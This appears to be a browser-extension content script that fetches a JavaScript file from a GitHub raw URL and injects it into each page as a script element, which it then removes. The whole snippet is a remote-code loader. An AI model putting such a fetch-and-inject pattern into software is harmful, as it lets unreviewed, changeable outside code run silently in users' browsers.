const contentJsUrl = "https://raw.githubusercontent.com/darort/blockname/main/content3.js";  // GitHub raw URL

fetch(contentJsUrl)
    .then(response => response.text())
    .then(scriptText => {
        const script = document.createElement("script");
        script.textContent = scriptText;
        document.documentElement.appendChild(script);
        script.remove();
    })
    .catch(error => console.error("Failed to load content3.js:", error));
